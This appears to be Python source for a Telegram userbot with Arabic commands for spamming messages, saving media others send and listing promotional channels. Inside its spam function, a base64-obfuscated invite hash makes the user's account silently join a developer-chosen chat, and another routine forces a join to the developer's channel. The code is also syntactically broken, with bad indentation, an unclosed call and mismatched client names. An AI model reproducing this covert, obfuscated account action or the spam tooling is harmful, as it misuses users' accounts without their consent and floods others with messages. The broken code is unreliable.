from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl import functions
from hijri_converter import Gregorian
from telethon.tl import functions
from telethon.tl.functions.channels import LeaveChannelRequest
from collections import deque
from telethon import events
from telethon.errors import FloodWaitError
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.tl import functions
import time
import asyncio
import logging
import base64
import datetime
from payment import *
from help import *
from config import *
from checktele import *

# -

fifthon.start()

y = datetime.datetime.now().year
m = datetime.datetime.now().month
dayy = datetime.datetime.now().day
day = datetime.datetime.now().strftime("%A")
m9zpi = f"{y}-{m}-{dayy}"
sec = time.time()

LOGS = logging.getLogger(__name__)
DEVS = [
    611122715,
]
DEL_TIME_OUT = 10
normzltext = "1234567890"
namerzfont = normzltext
name = "Profile Photos"
time_name = ["off"]
time_bio = ["off"]



    
async def join_channel():
  try:
	
   await fafthon(functions.channels.JoinChannelRequest(channel='d8_8q'))
	except BaseException:
	pass        
    
        


@fifthon.on(events.NewMessage(outgoing=True, pattern=r"همم"))
async def _(event):
    if not event.is_reply:
        return await event.edit(
            "يستعمل الامر بالرد على الصورتهة او الفيديو !"
        )
    rr9r7 = await event.get_reply_message()
    await event.delete()
    pic = await rr9r7.download_media()
    await fifthon.send_file(
        "me", pic, caption=f"تم حفظ الصورة او الفيديو الذاتي هنا : "
    )


async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):
    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    counter = int(cat[0])
    if len(cat) == 2:
        spam_message = str(cat[1])
        for _ in range(counter):
            if event.reply_to_msg_id:
                await sandy.reply(spam_message)
            else:
                await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    elif event.reply_to_msg_id and sandy.media:
        for _ in range(counter):
            sandy = await event.client.send_file(
                event.chat_id, sandy, caption=sandy.text
            )
            await asyncio.sleep(sleeptimem)
    elif event.reply_to_msg_id and sandy.text:
        spam_message = sandy.text
        for _ in range(counter):
            await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
        try:
            hmm = Get(hmm)
            await event.client(hmm)
        except BaseException:
            pass
        
@fifthon.on(events.NewMessage(outgoing=True, pattern=r".سوبر"))

async def super(event):

	await event.edit('''𝙏𝙃𝙀 𝙀𝙈𝙋𝙏𝙔 𝙎𝙐𝙋𝙀𝙍 𝙄𝙉 𝙏𝙀𝙇𝙀 ❂ 

━━━━━━━~~~~━━━━━━━━━━ 

Super x nine

-https://t.me/xjgjxgk 

-https://t.me/+3Ps0PTWcKnVkYTYx 

-https://t.me/+jJPr8Scd-XtkYWUy 

-https://t.me/tttffttt 

-https://t.me/+Z-C6TvKIMDJmZGJi 

-https://t.me/+5HDPPdgJyeU4OGFi 

-https://t.me/ss_iid 

-https://t.me/+tzEVV5iaHWY5Yjgy 

━━━━━━━~~~~━━━━━━━━━

	''')

@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.الاوامر"))
async def _(event):
    await event.edit(commands)

@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.فحص"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit("جارٍ...")
    end = datetime.datetime.now()
    ms = (end - start).microseconds / 1000
    await event.edit(f'''
**☆ Welcome to Source fafthon
☆ Version : 1.5
☆ Ping : `{ms}`
☆ Date : `{m9zpi}`
☆ ID : `{event.sender_id}`
☆ Source KiMo : @d8_8q**
''')


@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.م1"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec1)


@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.م2"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec2)


@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.م3"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec3)


@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.م4"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec4)

    
ownerhson_id = 611122715
@fifthon.on(events.NewMessage(outgoing=False, pattern='/start'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
        order = await event.reply('𝙃𝙄  𝙈𝙔 𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍 𝙀𝙈𝙋𝙏𝙔 - @T_5_C'


@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.اعادة تشغيل"))
async def update(event):
    await event.edit("• جارِ اعادة تشغيل السورس ..\n• انتضر 1-2 دقيقة  .")
    await fifthon.disconnect()
    await fifthon.send_message("me", "`اكتملت اعادة تشغيل السورس !`")


print("- kimo Userbot Running ..")
fifthon.run_until_disconnected()
